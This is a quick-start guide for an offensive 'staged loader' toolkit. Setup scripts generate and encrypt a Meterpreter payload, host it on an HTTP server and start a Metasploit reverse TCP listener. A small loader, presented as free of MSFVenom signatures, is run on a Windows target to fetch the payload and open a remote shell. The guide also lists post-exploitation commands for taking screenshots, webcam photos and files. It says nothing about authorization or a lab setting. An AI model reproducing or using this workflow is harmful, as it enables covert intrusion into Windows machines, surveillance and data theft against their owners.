# Quick Start Guide - Staged Loader

**Get up and running in 3 commands!**

---

## ⚡ Super Fast Setup

```bash
# 1. Run automated setup
./setup.sh

# 2. Start HTTP server (Terminal 1)
./start_server.sh

# 3. Start Metasploit listener (Terminal 2)
./start_listener.sh

# 4. Run staged_loader.exe on Windows target
```

**That's it!** You'll get a Meterpreter shell.

---

## 📋 Step-by-Step (First Time Users)

### 1️⃣ Setup (One Time)

```bash
cd /home/yenn/Desktop/beacons
./setup.sh
```

**Prompts:**
```
Enter your Kali IP (LHOST) [192.168.1.56]: <YOUR_IP>
Enter listener port (LPORT) [4444]: <YOUR_PORT>
Enter HTTP server port [8080]: <HTTP_PORT>
Continue with this configuration? (y/n): y
```

**Output:**
```
✅ Payload generated
✅ Payload encrypted
✅ Loader compiled
✅ Scripts created
```

---

### 2️⃣ Start Server

**Terminal 1:**
```bash
./start_server.sh
```

**Output:**
```
[*] Starting HTTP server on port 8080...
[*] Payload URL: http://192.168.1.56:8080/payload.enc
[+] Server is running. Press CTRL+C to stop.
```

**Leave this running!**

---

### 3️⃣ Start Listener

**Terminal 2:**
```bash
./start_listener.sh
```

**Output:**
```
[*] Starting Metasploit handler...
[*] Listening on: 192.168.1.56:4444
[*] Started reverse TCP handler on 192.168.1.56:4444
```

**Leave this running!**

---

### 4️⃣ Run on Windows

1. Copy `staged_loader.exe` to Windows machine
2. Double-click or run via command line
3. Wait 2-5 seconds

**In Metasploit console, you'll see:**
```
[*] Meterpreter session 1 opened (192.168.1.56:4444 -> 192.168.1.X:XXXXX)
```

---

### 5️⃣ Interact with Shell

**In Metasploit:**
```bash
# List sessions
sessions -l

# Connect to session
sessions -i 1

# You're now in Meterpreter!
meterpreter > sysinfo
meterpreter > getuid
meterpreter > pwd
meterpreter > shell     # Get cmd.exe shell
```

---

## 🔄 For Different Target (New IP/Port)

```bash
./setup.sh
# Enter new IP/Port
# Everything rebuilds automatically
```

---

## 🐛 Quick Troubleshooting

**No connection?**
```bash
# Check server is running
curl http://192.168.1.56:8080/payload.enc

# Check listener
# In Metasploit: jobs -l

# Check sessions
# In Metasploit: sessions -l
```

**Session dies?**
```bash
# Run loader again - it works!
# Sessions may take 5-10 seconds
```

---

## 📊 What You Get

| File | Size | Purpose |
|------|------|---------|
| `staged_loader.exe` | 17KB | Clean loader (NO MSFVenom) |
| `payload.enc` | 200KB | Encrypted Meterpreter |
| `start_server.sh` | - | HTTP server |
| `start_listener.sh` | - | Metasploit handler |

---

## ✅ Success Indicators

**HTTP Server:**
```
Serving HTTP on 0.0.0.0 port 8080
192.168.1.X - - [DATE] "GET /payload.enc HTTP/1.1" 200 -
```
☝️ Windows downloaded the payload!

**Metasploit:**
```
[*] Meterpreter session 1 opened
```
☝️ You got a shell!

**Meterpreter Prompt:**
```
meterpreter >
```
☝️ Interactive shell ready!

---

## 🎯 Common Commands

**In Meterpreter:**
```bash
sysinfo          # System information
getuid           # Current user
pwd              # Current directory
ls               # List files
cd C:\\Users     # Change directory
download file    # Download file
upload file      # Upload file
screenshot       # Take screenshot
webcam_snap      # Take photo
shell            # Get cmd.exe
```

**Session Management:**
```bash
sessions -l      # List sessions
sessions -i 1    # Interact with session 1
sessions -k 1    # Kill session 1
background       # Background session (CTRL+Z)
```

---

## 🚨 If Something Goes Wrong

**Reset everything:**
```bash
# Kill all
jobs -K          # In Metasploit
CTRL+C           # In HTTP server

# Restart
./setup.sh       # Regenerate everything
./start_server.sh
./start_listener.sh
```

---

**For detailed docs:** See `README.md`

**Generated:** $(date)
